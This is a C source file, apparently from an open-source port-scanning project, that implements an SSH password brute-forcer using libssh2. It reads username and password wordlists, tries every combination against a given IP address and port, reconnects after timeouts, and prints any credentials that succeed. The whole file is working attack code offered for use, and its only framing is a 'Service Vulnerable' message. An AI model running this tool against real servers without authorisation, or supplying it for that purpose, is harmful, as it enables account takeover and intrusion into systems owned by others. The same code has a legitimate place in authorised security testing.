/*
 ============================================================================
 Name        : Hack_Ssh.c
 Author      : L.
 Version     : 1.0.5
 Copyright   : GNU General Public License v3.0
 Description : Hack SSH
 ============================================================================
 */

#include "TCP_Syn_Port_Scanner.h"

#define LIBSSH2_INIT_NO_CRYPTO 0x0001

int hack_ssh(in_addr_t ip, int port){
	printf("\nTrying to perform connections by using brute force...\n\n");
	printf("%s",BLUE);
	char *userauthlist;
	int auth_pw = 0, timeouts=0;
	LIBSSH2_SESSION *session=NULL;
	int sk=create_SSH_handshake_session(&session, ip, port);
	if(sk<0){
		printf("create_SSH_handshake_session() error: Error: %d (%s)\n", errno, strerror(errno));
		goto exit;
	}
	const char *fingerprint;
	fingerprint = libssh2_hostkey_hash(session, LIBSSH2_HOSTKEY_HASH_SHA1);
	printf("Fingerprint: ");
	for(int i = 0; i < 20; i++) printf("%02X ", (unsigned char)fingerprint[i]);
	printf("\n");
	FILE *f=NULL;
	int i=0;
	double totalUsernames=0, totalComb=0, cont=0;
	if((totalUsernames=open_file("usernames_FTP_SSH.txt",&f))==-1) return RETURN_ERROR;
	char **usernames = (char**)malloc(totalUsernames * sizeof(char*));
	for (i=0;i<totalUsernames;i++) usernames[i] = (char*)malloc(50 * sizeof(char));
	i=0;
	while(fscanf(f,"%s", usernames[i])!=EOF) i++;
	int totalPasswords=0;
	if((totalPasswords=open_file("passwords_SSH.txt",&f))==-1) return RETURN_ERROR;
	char **passwords = (char**)malloc(totalPasswords * sizeof(char*));
	for (i=0;i<totalPasswords;i++) passwords[i] = (char*)malloc(50 * sizeof(char));
	i=0;
	while(fscanf(f,"%s", passwords[i])!=EOF) i++;
	totalComb=totalUsernames*totalPasswords;
	for(i=0;i<totalUsernames;i++){
		for(int j=0;j<totalPasswords;j++,cont++){
			if(timeouts==1){
				libssh2_session_disconnect(session, "");
				sk=create_SSH_handshake_session(&session, ip, port);
				if(sk<0){
					printf("create_SSH_handshake_session() error: Error: %d (%s)\n", errno, strerror(errno));
					goto exit;
				}
				timeouts=0;
				j--;
			}
			printf("\rPercentaje completed: %.4lf%% (%s/%s)                   ",(double)((cont/totalComb)*100.0),usernames[i], passwords[j]);
			fflush(stdout);
			usleep(BRUTE_FORCE_DELAY);
			userauthlist = libssh2_userauth_list(session, usernames[i], strlen(usernames[i]));
			if(userauthlist==NULL){
				timeouts++;
				continue;
			}
			if(strstr(userauthlist, "password") != NULL) auth_pw |= 1;
			if(strstr(userauthlist, "keyboard-interactive") != NULL) auth_pw |= 2;
			if(strstr(userauthlist, "publickey") != NULL) auth_pw |= 4;
			if(auth_pw & 1) {
				if(libssh2_userauth_password(session, usernames[i], passwords[j])) {
					continue;
				}
				else {
					printf("%s",HRED);
					printf("Authentication by password succeeded. User: %s, password: %s\n", usernames[i],passwords[j]);
					printf("Service Vulnerable\n\n");
					printf("%s",BLUE);
				}
			}else if(auth_pw & 2) {
				timeouts++;
				continue;
			}else if(auth_pw & 4) {
				timeouts++;
				continue;
			}
			else {
				printf("No supported authentication methods found\n");
				timeouts++;
				continue;
			}
		}
	}
	return 0;
	exit:
	libssh2_session_disconnect(session, "");
	libssh2_session_free(session);
	printf("%s", DEFAULT);
	close(sk);
	return RETURN_ERROR;
}

int create_SSH_handshake_session(LIBSSH2_SESSION **session, in_addr_t ip, int port){
	int rc = libssh2_init(0);
	if(rc != 0) {
		printf("libssh2_init() error: Error: %d (%s)\n", errno, strerror(errno));
		return RETURN_ERROR;
	}
	int sk=socket(AF_INET,SOCK_STREAM, 0);
	if(sk<0){
		printf("socket() error: Error: %d (%s)\n", errno, strerror(errno));
		return RETURN_ERROR;
	}
	struct sockaddr_in serverAddress;
	serverAddress.sin_family = AF_INET;
	serverAddress.sin_port=htons(port);
	serverAddress.sin_addr.s_addr= ip;
	if(connect(sk, (struct sockaddr *) &serverAddress, sizeof(serverAddress))<0){
		printf("connect() error: Error: %d (%s)\n", errno, strerror(errno));
		return -1;
	}
	*session = libssh2_session_init();
	if(libssh2_session_handshake(*session, sk)) {
		printf("libssh2_session_handshake() error: Error: %d (%s)\n", errno, strerror(errno));
		return -1;
	}
	return sk;
}
